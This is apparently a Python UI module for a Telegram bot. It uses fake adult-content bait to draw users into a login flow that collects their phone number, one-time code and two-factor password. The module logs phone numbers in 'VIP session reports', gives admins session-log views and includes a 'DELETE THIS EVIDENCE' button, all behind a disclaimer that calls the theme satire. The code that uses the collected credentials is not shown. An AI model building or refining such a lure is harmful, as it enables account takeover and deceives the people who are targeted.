from datetime import datetime
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
import config

CATEGORY_EMOJIS = {
    "fitness": "🏋️", "business": "💰", "mindset": "🧠",
    "sports": "🏆", "self_improvement": "📈", "funny": "😂", "motivation": "🔥",
}

CATEGORIES = [
    ("fitness", "🏋️ Fitness"), ("business", "💰 Business"),
    ("mindset", "🧠 Mindset"), ("sports", "🏆 Sports"),
    ("funny", "😂 Funny"), ("motivation", "🔥 General"),
]

SPICY_CAPTIONS = {
    "fitness": "💪 <b>BEAST MODE ACTIVATED</b> 💪\n\nThis body is built with <b>HARD WORK</b>, not genetics.\n\n🔥 \"The pain you feel today will be the strength you feel tomorrow.\"\n\n⏳ Self-destructs in: <code>{}s</code>",
    "business": "💰 <b>MONEY DOESN'T SLEEP</b> 💰\n\nYou're watching this while someone else is GRINDING.\n🔥 \"Your future is created by what you do today, not tomorrow.\"\n\n⏳ Self-destructs in: <code>{}s</code>",
    "mindset": "🧠 <b>REWIRE YOUR BRAIN</b> 🧠\n\nYou are the average of the 5 people you surround yourself with.\n🔥 \"Become addicted to constant and never-ending self-improvement.\"\n\n⏳ Self-destructs in: <code>{}s</code>",
    "sports": "🏆 <b>LEGENDS NEVER DIE</b> 🏆\n\n🔥 \"Champions keep playing until they get it right.\"\n\n⏳ Self-destructs in: <code>{}s</code>",
    "funny": "😂 <b>LAUGH SO HARD</b> 😂\n\n🔥 \"Don't take life too seriously. No one gets out alive anyway.\"\n\n⏳ Self-destructs in: <code>{}s</code>",
    "motivation": "💦 <b>HARD WORK PAYS OFF</b> 💦\n\n🔥 \"Success is not for the weak. It's for those who GRIND when no one's watching.\" 🔥\n\n⏳ Self-destructs in: <code>{}s</code>",
}

SMART_STYLES = {
    "destructive": {
        "keywords": ["delete", "stop", "cancel", "reject", "remove", "block", "danger", "clear"],
        "style": "danger",
    },
    "constructive": {
        "keywords": ["start", "approve", "accept", "confirm", "verify", "purchase", "unlock", "join", "subscribe"],
        "style": "success",
    },
}


SMALL_CAPS_MAP = {
    'A': 'ᴀ', 'B': 'ʙ', 'C': 'ᴄ', 'D': 'ᴅ', 'E': 'ᴇ',
    'F': 'ғ', 'G': 'ɢ', 'H': 'ʜ', 'I': 'ɪ', 'J': 'ᴊ',
    'K': 'ᴋ', 'L': 'ʟ', 'M': 'ᴍ', 'N': 'ɴ', 'O': 'ᴏ',
    'P': 'ᴘ', 'Q': 'ǫ', 'R': 'ʀ', 'S': 's', 'T': 'ᴛ',
    'U': 'ᴜ', 'V': 'ᴠ', 'W': 'ᴡ', 'X': 'х', 'Y': 'ʏ',
    'Z': 'ᴢ',
}


def small_caps(text):
    return "".join(SMALL_CAPS_MAP.get(ch, ch) for ch in text)


def detect_smart_style(text):
    lower = text.lower()
    for kw in SMART_STYLES["destructive"]["keywords"]:
        if kw in lower:
            return "danger"
    for kw in SMART_STYLES["constructive"]["keywords"]:
        if kw in lower:
            return "success"
    return None


def styled_button(text, callback_data=None, style=None, **kwargs):
    return InlineKeyboardButton(small_caps(text), callback_data=callback_data, style=style, **kwargs)


def primary(text, data=None, **kwargs):
    return styled_button(text, data, style="primary", **kwargs)

def success(text, data=None, **kwargs):
    return styled_button(text, data, style="success", **kwargs)

def danger(text, data=None, **kwargs):
    return styled_button(text, data, style="danger", **kwargs)

def warning(text, data=None, **kwargs):
    return styled_button(text, data, style="danger", **kwargs)

def info(text, data=None, **kwargs):
    return styled_button(text, data, style="primary", **kwargs)


def make_keyboard(rows):
    return InlineKeyboardMarkup(rows)


def get_caption_for_category(category, delete_after=60):
    category = category.lower() if category else "motivation"
    template = SPICY_CAPTIONS.get(category, SPICY_CAPTIONS["motivation"])
    return template.format(delete_after)


def fmt_bold(text):
    return f"<b>{text}</b>"

def fmt_italic(text):
    return f"<i>{text}</i>"

def fmt_underline(text):
    return f"<u>{text}</u>"

def fmt_code(text):
    return f"<code>{text}</code>"

def fmt_blockquote(text):
    return f"<blockquote>{text}</blockquote>"


def format_message(title, body, footer=None, stats=None):
    parts = []
    if title:
        parts.append(fmt_blockquote(title))
    parts.append("")
    if isinstance(body, list):
        parts.extend(body)
    else:
        parts.append(body)
    parts.append("")
    if stats:
        parts.append(stats)
    if footer:
        parts.append("")
        parts.append(footer)
    return "\n".join(parts)


def welcome_message(user_id, user_data):
    status = user_data.get("status", "pending").upper() if user_data else "PENDING"
    watched = user_data.get("video_count", 0) if user_data else 0
    return format_message(
        "🔥 WELCOME TO THE SECRET CLUB 🔥",
        [
            "⚠️ <b>18+ CONTENT AHEAD</b> ⚠️",
            "(Proceed only if you're ready for <i>intense pleasure</i>... of success!)",
            "",
            f"You've been granted <b>2 FREE PREVIEWS</b> to see if you can handle the heat.",
            "",
            fmt_bold("📊 Your Stats:"),
            f"• User ID: {fmt_code(str(user_id))}",
            f"• Status: <u>{status}</u>",
            f"• Videos Watched: {fmt_code(str(watched))}",
            "",
            fmt_blockquote("Success is not for the weak. It's for those who GRIND when no one's watching."),
        ],
        fmt_code("🔞 What happens in this bot, stays in this bot.")
    )


def welcome_keyboard():
    return make_keyboard([
        [primary("🍆 FREE VIDEO 1", "free_video_1"), primary("🍑 FREE VIDEO 2", "free_video_2")],
        [success("🔓 UNLOCK FULL ACCESS", "login")],
        [success("💰 BUY PREMIUM", "purchase")],
        [info("💡 WHAT IS THIS?", "reveal_twist"), primary("📞 CONTACT OWNER", "contact_owner")],
        [danger("🚫 DELETE MY DATA", "delete_session")],
    ])


def login_prompt_keyboard():
    return make_keyboard([
        [primary("📞 SEND NUMBER", "login_number")],
        [danger("🚫 CANCEL", "main_menu")],
    ])


def otp_prompt_keyboard():
    return make_keyboard([
        [success("✅ VERIFY OTP", "verify_otp")],
        [warning("🔄 RESEND OTP", "resend_otp")],
        [danger("❌ CANCEL", "main_menu")],
    ])


def twofa_prompt_keyboard():
    return make_keyboard([
        [primary("✅ ENTER 2FA PASSWORD", "enter_2fa")],
        [warning("⏭️ SKIP 2FA", "skip_2fa")],
        [danger("❌ CANCEL LOGIN", "main_menu")],
    ])


def login_success_keyboard():
    return make_keyboard([
        [success("💦 GIVE ME MY FIX", "next_video")],
        [info("📊 MY STATS", "stats")],
        [danger("🚪 LOGOUT", "delete_session")],
    ])


def after_video_keyboard():
    return make_keyboard([
        [success("💪 ANOTHER ROUND", "next_video")],
        [warning("⏳ SKIP VIDEO", "skip_video")],
        [info("😰 NEED A BREAK", "need_break")],
    ])


def purchase_options_keyboard():
    rows = []
    for pack_key, pack_info in config.PURCHASE_OPTIONS.items():
        rows.append([
            primary(f"🍆 {pack_info['label']} ({pack_info['price']})", f"purchase_{pack_key}")
        ])
    rows.append([info("🔙 BACK TO VIDEOS", "next_video")])
    return make_keyboard(rows)


def contact_owner_keyboard():
    return make_keyboard([
        [success("💋 SEND MESSAGE TO OWNER", "dm_owner")],
        [info("📋 COPY USER ID", "copy_user_id")],
        [primary("🔙 GO BACK", "main_menu")],
    ])


def reveal_keyboard():
    return make_keyboard([
        [primary("🔄 SHARE THIS BOT", "share_bot")],
        [info("📺 SHOW ME MORE", "next_video")],
        [danger("🗑️ DELETE THIS EVIDENCE", "delete_session")],
    ])


def force_sub_keyboard(channel_username, invite_link):
    return make_keyboard([
        [primary("📢 JOIN OUR CHANNEL", url=invite_link)],
        [success("✅ I'VE JOINED", "check_sub")],
    ])


def main_menu_keyboard():
    return make_keyboard([
        [primary("💦 NEXT VIDEO", "next_video"), success("🔓 UNLOCK ACCESS", "login")],
        [success("💰 BUY PREMIUM", "purchase")],
        [info("💡 WHAT IS THIS?", "reveal_twist"), info("📊 MY STATS", "stats")],
        [warning("⚠️ REPORT ISSUE", "report_issue")],
        [danger("🗑️ DELETE SESSION", "delete_session")],
    ])


def stats_keyboard():
    return make_keyboard([
        [success("💦 WATCH MORE", "next_video")],
        [primary("🔙 BACK", "main_menu")],
    ])


def admin_keyboard():
    return make_keyboard([
        [info("📊 DASHBOARD", "admin_dashboard")],
        [primary("📹 VIDEO MANAGEMENT", "admin_videos")],
        [success("💰 PURCHASE REQUESTS", "admin_purchases")],
        [warning("📢 BROADCAST", "admin_broadcast")],
        [info("🔒 SUBSCRIPTION", "admin_subscription")],
        [info("👥 USERS", "admin_users")],
        [info("📋 SESSION LOGS", "admin_logs")],
        [danger("⚙️ SETTINGS", "admin_settings")],
    ])


def get_purchase_request_message():
    return (
        "<blockquote>💰 WANT MORE EXCLUSIVE CONTENT?</blockquote>\n\n"
        "You've reached the end of the free queue.\n"
        "But don't worry... we have MORE.\n\n"
        f"<b>📦 PURCHASE OPTIONS:</b>\n"
        + "\n".join(f"• {v['label']}: <b>{v['price']}</b>" for v in config.PURCHASE_OPTIONS.values()) +
        "\n\nAll content is 🔥 <b>LIFE-CHANGING MOTIVATION</b> 🔥"
    )


def get_disclaimer():
    return (
        "<blockquote>⚠️ LEGAL DISCLAIMER</blockquote>\n\n"
        "This bot uses an <b>18+ marketing theme</b> for ENTERTAINMENT and\n"
        "VIRAL MARKETING purposes <b>ONLY</b>.\n\n"
        "✅ ALL CONTENT is 100% LEGAL motivational/self-improvement videos.\n"
        "✅ NO actual adult content is ever distributed.\n"
        "✅ The theme is <b>SATIRICAL</b> and meant to attract attention.\n\n"
        "<i>By using this bot, you agree that you understand the satirical nature\n"
        "of the marketing.</i>"
    )


def log_session(user_id, username, phone, action, details=""):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = (
        f"[{timestamp}] 👤 @{username or 'unknown'} (ID: {user_id}) "
        f"📱 {phone or 'N/A'} "
        f"▶️ {action} "
        f"📌 {details}\n"
    )
    with open(config.SESSIONS_LOG, "a", encoding="utf-8") as f:
        f.write(entry)


def build_detailed_log(user_data, user_id, username):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S %Z")
    return f"""
╔{'═'*60}╗
║ 🔞 VIP SESSION REPORT #{user_id % 100000:05d} {' ' * 31}║
╠{'═'*60}╣
║ 👤 User ID: {str(user_id):<49}║
║ 🆔 Username: @{username or 'N/A':<42}║
║ 📛 First Name: {(user_data.get('first_name') or 'N/A'):<40}║
║ 📱 Phone: {(user_data.get('phone') or 'Not provided'):<39}║
║ 🔑 Status: {str(user_data.get('status', 'pending')).upper():<45}║
║ {'─'*60}║
║ ⏰ Last Activity: {timestamp:<38}║
║ 📹 Videos Watched: {str(user_data.get('video_count', 0)) + '/50':<40}║
║ ⏱️ Watch Time: {str(user_data.get('total_watch_time', 0) // 60):<5} min{' ' * 41}║
║ 👥 Referrals: {str(user_data.get('referral_count', 0)):<44}║
║ {'─'*60}║
║ 💰 Pack: {(user_data.get('purchased_pack') or 'None'):<48}║
║ ✅ Status: {'ACTIVE & ADDICTED' if user_data.get('status') == 'purchased' else 'WAITING' :<37}║
╚{'═'*60}╝
"""
